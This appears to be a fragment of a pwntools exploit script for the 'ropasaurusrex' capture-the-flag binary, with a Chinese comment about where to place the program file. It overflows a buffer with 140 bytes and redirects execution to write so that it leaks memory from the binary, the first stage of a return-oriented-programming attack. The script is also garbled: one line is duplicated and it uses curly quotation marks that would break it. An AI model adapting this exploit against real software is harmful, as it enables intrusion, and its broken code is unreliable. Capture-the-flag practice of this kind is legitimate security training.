from pwn import *

io = process("./ropasaurusrex")
elf = ELF('./ropasaurusrex')



elf = ELF(‘./ropasaurusrex’)         #别忘了在脚本所在目录下放一个程序文件ropasaurusrex
 
write_addr = elf.symbols['write']
 
payload = “A”*140
payload += p32(write_addr)
payload += p32(0)
payload += p32(1)
payload += p32(0x08048000)
payload += p32(8)

io.sendline(payload)
io.recv()